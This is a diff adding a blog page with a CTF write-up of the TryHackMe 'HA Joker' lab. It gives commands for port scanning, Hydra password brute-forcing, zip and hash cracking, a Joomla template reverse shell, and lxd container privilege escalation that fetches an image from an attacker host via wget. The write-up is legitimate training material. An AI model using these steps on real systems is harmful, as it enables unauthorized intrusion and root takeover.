@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta content="IE=edge" http-equiv="X-UA-Compatible">
+  <meta content="width=device-width,initial-scale=1" name="viewport">
+  <meta content="This website is owned to drf0x with great writeups and more!" name="description">
+  <meta name="google" content="notranslate" />
+  <meta content="developped by drf0x" name="author">
+  <meta itemProp="image" content="./assets/Hacker.gif"/>
+  <meta name="msapplication-tap-highlight" content="no">
+  <meta name="og:image" content="https://drf0x.github.io/assets/Hacker.gif">
+  <meta content="https://drf0x.github.io/assets/Hacker.gif" name="twitter:image:src" />
+
+  <link rel="apple-touch-icon" sizes="180x180" href="./assets/Hacker.gif">
+  <link href="./assets/Hacker.gif" rel="icon">
+  
+  <title>HA Joker CTF</title>  
+
+<link href="./main.3f6952e4.css" rel="stylesheet"></head>
+
+<body class="minimal" >
+  <body style="background-color: black;">
+
+    <div class="bg-animation">
+        <div id="stars"></div>
+        <div id="stars2"></div>
+        <div id="stars3"></div>
+        <div id="stars4"></div>
+    </div>
+
+</body>
+<div id="site-border-left"></div>
+<div id="site-border-right"></div>
+<div id="site-border-top"></div>
+<div id="site-border-bottom"></div>
+<header style="position: fixed;width: 100%;z-index: 1000;">
+  <nav class="white-text-container" style="height: 110px;background-color: rgba(0, 0, 0, 0); opacity: .9; padding-top: 20px;padding-bottom: 20px;">
+    <div class="container">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+
+        <ul class="nav navbar-nav " style="margin-top: 32px;">
+          <li><a href="./index.html" title="">01 : Home</a></li>
+          <li><a href="./writeups.html" title="">02 : Writeups</a></li>
+          <li><a href="./about.html" title="">03 : About me</a></li>
+        </ul>
+          <!--      
+         <div class="locate" style="float: right;">
+         <script src="https://tryhackme.com/badge/172872"></script>
+    -->  
+    </div>
+      </div> 
+    </div>
+  </nav>
+</header>
+  <div class="hero-full-container background-image-container white-text-container" >
+    <div class="container">
+      <div class="row">
+        <div class="col-xs-12">
+          <div class="hero-full-wrapper">
+            <div class="text-content mytext">
+              <h1>HA Joker CTF<br>
+                 <font size=4>Posted 16/9/2021 by Drf0x</font>
+
+                <div class="paragragh">
+                  <p>
+<br>
+<br /><br />Difficulty: <font color=orange> Medium</font><br /><br /><br />Points: 450<br /><br /><br />Room Link: <a href="https://tryhackme.com/room/jokerctf"><font color=grey>Click Here</font></a><br /><br /><br /><br />
+<br></br><br></br>
+<h2>Task 1: Enumerating starting with Nmap</h2>
+<br>
+<p>#</p>
+<br>
+<h2>Task 2: Checking verions on open ports</h2>
+<br>
+<p>Doing a simple nmap scan should tell us the infomation needed for the open ports.</p>
+<br>
+<p><span class="highlight">nmap -v -sC -sV -oA nmap  10.10.173.35</span></p>
+<br>
+<img src="./joker/1.png">
+<br>
+<p>v. 2.4.29</p>
+<br>
+<h2>Task 3: Open http port</h2>
+<br>
+<p>Taking a closer look at the nmap scan or just testing each port we can see port 80 seems to be accessable by anyone.</p>
+<br>
+<img src="./joker/2.png">
+<br>
+<p>Port 80</p>
+<br>
+<h2>Task 4: Searching directories</h2>
+<br>
+<p>With task 4 we are asked to find a ‘secret’ directory. This was pretty easy to just guess but you could also use gobuster if you were unsure.</p>
+<br>
+<img src="./joker/3.png">
+<br>
+<p>/secret.txt</p>
+<br>
+<h2>Task 5: Another gobuster</h2>
+<br>
+<p>For this I just ran a basic gobuster using common.txt whcih only takes a few minutes, here we can find the answer.</p>
+<br>
+<img src="./joker/4.png">
+<br>
+<p>/phpinfo.php</p>
+<br>
+<h2>Task 6: Taking a look at /secret.txt</h2>
+<br>
+<p>After viewing /secret.txt we see a convosation between Joker and Batman which seem to be the only names suspicion of possible users.</p>
+<br>
+<img src="./joker/5.png">
+<br>
+<p>joker</p>
+<br>
+<h2>Task 7:  Unauthorized http port</h2>
+<br>
+<p>Taking a look back on the nmap scan we see port 8080 is unauthorized.</p>
+<br>
+<img src="./joker/6.png">
+<br>
+<p>8080</p>
+<br>
+<h2>Task 8: Brute force</h2>
+<br>
+<p>Looks like for this task we are going to have to brute force the port, for this we will be using Hydra.</p>
+<br>
+<p><span class="highlight">hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.173.35 http-get</span>/</p>
+<br>
+<img src="./joker/7.png">
+<br>
+<p>hannah</p>
+<br>
+<h2>Task 9: Another gobuster...</h2>
+<br>
+<p>For this task were gonna use gobuster again to search the directories on port 8080</p>
+<br>
+<p><span class="highlight">gobuster -U joker -P hannah - dir -u http://10.10.173.35:8080/ -w /usr/share/wordlists/dirb/common.txt -t 20</span></p>
+<br>
+<img src="./joker/8.png">
+<br>
+<img src="./joker/9.png">
+<br>
+<p>/administrator/</p>
+<br>
+<h2>Task 10: Enumertaing</h2>
+<br>
+<p>For this we asked to find the ‘backup’ file, after enumerating for a while I eventually fell back to nikto which gives a bit more of a in-depth scan compared to gobuster</p>
+<br>
+<p><span class="highlight">nikto -h http://10.10.173.35:8080/ -id joker:hannah</span></p>
+<br>
+<img src="./joker/10.png">
+<br>
+<p>/backup.zip</p>
+<br>
+<h2>Task 11: Cracking a zip</h2>
+<br>
+<p>When we visit /backup.zip we can download a zip file but it seems to be password protected, lets crack it!</p>
+<br>
+<p><span class="highlight">zip2john backup.zip > joker.hash</span></p>
+<br>
+<p>sudo john joker.hash</p>
+<br>
+<img src="./joker/12.png">
+<br>
+<p>hannah</p>
+<br>
+<h2>Task 12: Looking into dp file</h2>
+<br>
+<p>Ok so we got access to this ‘Backup’ file now, lets enumerate. We are told to look for a “super duper user”, lets search for it in joombadb.sql!</p>
+<br>
+<p>^F super duper user
+<br>
+<img src="./joker/13.png">
+<br>
+<p>admin</p>
+<br>
+<h2>Task 13:</h2>
+<br>
+<p>Looks like we got a password hash for admin from that db file, lets crack it!</p>
+<br>
+<p><span class="highlight">echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > pass.txt</span></p>
+<br>
+<p><span class="highlight">sudo john pass.txt --show</span></p>
+<br>
+<img src="./joker/14.png">
+<br>
+<p>abcd1234</p>
+<br>
+<h2>Task 14: Getting a shell</h2>
+<br>
+<p>Ok so now we have access to the administrator pannel. lets try to get a shell. After enumerating for a bit I found that we can abuse templates to create a reverse shell!</p>
+<br>
+<img src="./joker/15.png">
+<br>
+<p>Beez3 looks intresting, lets take a look.</p>
+<br>
+<br>
+<img src="./joker/16.png">
+<br>
+<br>
+<p>Ahhhh, seems like we can edit the php directorys of the website, lets replace it with a reverse shell .</p>
+<br>
+<br>
+<img src="./joker/17.png">
+<br>
+<img src="./joker/18.png">
+<br>
+<br>
+<p>Ok we got our reverse shell set now we just need to set up a listener and run the shell.</p>
+<br>
+<img src="./joker/19.png">
+<br>
+<p>Looks like when we preview the template it runs the code with in it!</p>
+<br>
+<img src="./joker/20.png">
+<br>
+<img src="./joker/21.png">
+<br>
+<p>Sick! looks like the reverse shell worked.</p>
+<br>
+<img src="./joker/22.png">
+<br>
+<p>Lets check who we are</p>
+<br>
+<img src="./joker/23.png">
+<br>
+<p>www-data</p>
+<br>
+<h2>Task 15: Enumerating</h2>
+<br>
+<p>This task asked to to check the groups of the user which differs from our normal gorups</p>
+<br>
+<img src="./joker/24.png">
+<br>
+<p>lxd</p>
+<br>
+<h2>Task 16: Spawing tty shell</h2>
+<br>
+<p>Looks like we need to create a tty shell...</p>
+<br>
+<p><span class="highlight">python3 -c 'import pty; pty.spawn("/bin/bash");'</span></p>
+<br>
+<img src="./joker/25.png">
+<br>
+<br>
+<h2>Task 17: Researching</h2>
+<br>
+<p>Looks like were being told to abuse the group ‘lxd’ for a possivle privesc, lest research</p>
+<br>
+<p>https://www.hackingarticles.in/lxd-privilege-escalation/</p>
+<br>
+<h2>Task 18:</h2>
+<br>
+<p>#</p>
+<br>
+<h2>Task 19:</h2>
+<br>
+<p>#</p>
+<br>
+<h2>Task 20: Getting root</h2>
+<br>
+<p>Ok so looks like were going to have to abuse lxd to give ourselfs root, sounds pretty easy</p>
+<br>
+<p>All that matter really when filling out this is to have storage backend set to ‘dir’</p>
+<br>
+<p>lxd init</p>
+<br>
+<img src="./joker/26.png">
+<br>
+<p><span class="highlight">git clone  https://github.com/saghul/lxd-alpine-builder.git</span></p>
+<br>
+<p><span class="highlight">cd lxd-alpine-builder</span></p>
+<br>
+<p><span class="highlight">./build-alpine</span></p>
+<br>
+<img src="./joker/27.png">
+<br>
+<img src="./joker/28.png">
+<br>
+<p>Ok cool looks like we got all the files we need downloaded, now its time to upload them.</p>
+<br>
+<p><span class="highlight">sudo python3 -m http.server 80</span></p>
+<br>
+<img src="./joker/29.png">
+<br>
+<p>Ok now to download it from the shell we got</p>
+<br>
+<p><span class="highlight">cd /tmp</span></p>
+<br>
+<p><span class="highlight">wget http://10.45.54.205:80/alpine-v3.12-x86_64-20200923_0009.tar.gz</span></p>
+<br>
+<img src="./joker/30.png">
+<br>
+<p><span class="highlight">lxc image import ./alpine-v3.12-x86_64-20200923_0009.tar.gz --alias myimage</span></p>
+<br>
+<img src="./joker/31.png">
+<br>
+<p><span class="highlight">lxc init myimage ignite -c security.privileged=true</span></p>
+<br>
+<p><span class="highlight">lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span></p>
+<br>
+<p><span class="highlight">lxc start ignite</span></p>
+<br>
+<p><span class="highlight">lxc exec ignite /bin/sh</span></p>
+<br>
+<img src="./joker/32.png">
+<br>
+<p>Nice! And as easy as that we got root.
+<br>
+<br>
+<p>final.txt
+<br>
+<br>
+<p>Thank you for reading my writeup and hopfully you learned something for this!</p>
+<br>
+<br>
+<br>
+
+                </div>
+              </h1>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function (event) {
+     type();
+     movingBackgroundImage();
+  });
+</script>
+
+
+<script type="text/javascript" src="./main.70a66962.js"></script></body>
+
+</html>
